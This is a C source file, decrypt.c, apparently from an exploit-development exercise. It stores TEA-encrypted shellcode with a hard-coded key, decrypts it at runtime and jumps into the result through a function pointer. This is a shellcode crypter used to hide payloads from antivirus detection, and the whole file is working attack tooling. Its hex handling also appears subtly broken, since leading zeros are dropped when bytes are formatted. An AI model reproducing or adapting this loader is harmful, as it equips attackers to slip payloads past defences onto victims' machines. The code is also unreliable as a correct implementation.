/* decrypt.c
 *  - Decrypt shellcode using the Tiny Encryption Algorithm
 *
 * [LINK] https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

unsigned char code[] = \
"\xb2\xfc\xbc\x21\xbf\x23\xd1\x27\x1c\x5b\xb8\x35\x7d\xe9\x28\x48\x86\xb9\x4c\xb4\xb9\x78\xc9\x55\xd1\xda\xf0\x78\xd4\x1a\xd1\x42";

const int BUFSIZE = 8;
uint32_t KEY[] = {0xbe168aa1, 0x16c498a3, 0x5e87b018, 0x56de7805};

/* ********************************************************** *
   Tiny Encryption Algorithm
 * ********************************************************** */

void encrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i < 32; i++) {                       /* basic cycle start */
        sum += delta;
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}

void decrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i<32; i++) {                         /* basic cycle start */
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        sum -= delta;
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}

/* ********************************************************** *
   Utility Functions
 * ********************************************************** */

int chunk(const unsigned char *src, unsigned char **dest, const int len) {
  int i = 0, j = 0, srclen = strlen(src);
  char *tmp = *dest;

  for (i = 0; i < srclen; i++) {
    for (j = 0; j < len; j++) {
      *tmp++ = src[i++];
    }
    *tmp++ = '\n';
    i--;
  }

  *tmp++ = '\0';

  return 0;
}

int finalize(unsigned char *src, unsigned char **dest, const int len) {
  int i = 0, j = 0, srclen = strlen(src);
  char *tmp = *dest, buf[len + 1];

  for (i = 0; i < srclen; i++) {
    memset(buf, '\0', len + 1);
    for (j = 0; j < len; j++) {
      memset(&buf[j], src[i++], 1);
    }
    uint32_t num = strtoul(buf, NULL, 16);
    *tmp++ = num;
    i--;
  }

  return 0;
}

/* ********************************************************** *
   Main
 * ********************************************************** */

int main() {

  int beforeLength, chunkedLength, afterLength, finalLength;
  unsigned char *before, *chunked, *after, *token, *final;

  beforeLength = strlen(code)*2;
  before = malloc(sizeof(unsigned char)*beforeLength + 1);
  memset(before, '\0', beforeLength + 1);
  for (int i = 0; i < beforeLength/2; i++) {
    sprintf(&before[i*2], "%x", code[i]);
  }

  printf("[+] Encrypted (%i): %s\n", strlen(before)/2-2, before);

  chunkedLength = beforeLength*2;
  chunked = malloc(sizeof(unsigned char)*chunkedLength + 1);
  memset(chunked, '\0', chunkedLength + 1);
  chunk(before, &chunked, BUFSIZE);

  afterLength = beforeLength;
  after = malloc(sizeof(unsigned char)*afterLength + 1);
  memset(after, '\0', afterLength + 1);

  token = strtok(chunked, "\n");
  while (token != NULL) {
    uint32_t v0 = strtoul(token, NULL, 16);
    printf("[+] Chunked (%i): %s\n", strlen(token)/2, token);

    token = strtok(NULL, "\n");
    if (token == NULL) {
      token = "0";
    }
    uint32_t v1 = strtoul(token, NULL, 16);
    printf("[+] Chunked (%i): %s\n", strlen(token)/2, token);

    printf("[~] Decrypting: {0x%08x, 0x%08x}\n", v0, v1);
    uint32_t v[] = {v0, v1};
    decrypt(v, KEY);
    printf("[+] Decrypted: {0x%08x, 0x%08x}\n", v[0], v[1]);

    unsigned char buf[BUFSIZE + 1];
    memset(buf, '\0', BUFSIZE);
    sprintf(buf, "%x", v[0]);
    memset(&buf[BUFSIZE], '\0', 1);
    strcat(after, buf);

    memset(buf, '\0', BUFSIZE);
    sprintf(buf, "%x", v[1]);
    memset(&buf[BUFSIZE], '\0', 1);
    strcat(after, buf);

    token = strtok(NULL, "\n");
  }

  printf("[+] Decrypted (%i): %s\n", strlen(after)/2, after);

  finalLength = afterLength / 2;
  final = malloc(sizeof(unsigned char)*finalLength + 1);
  memset(final, '\0', finalLength);
  finalize(after, &final, 2);
  memset(&final[finalLength], '\0', 1);

  int (*ret)() = (int(*)())final;
  ret();

  free(before);
  free(chunked);
  free(after);
  free(final);

  return 0;
}
